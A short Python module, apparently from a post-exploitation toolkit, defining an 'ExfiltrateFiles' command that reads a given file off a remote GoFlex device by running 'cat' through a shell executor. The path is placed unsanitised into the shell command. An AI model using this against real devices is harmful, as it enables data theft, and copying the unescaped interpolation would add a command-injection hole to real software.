from goflex_shell.command_executor import CommandExecutor
from wrappers.base_wrapper import BaseCommand


class ExfiltrateFiles(BaseCommand):

    def execute(self, path: str) -> bytes:
        return CommandExecutor.execute(self.ip, f'cat "{path}"')
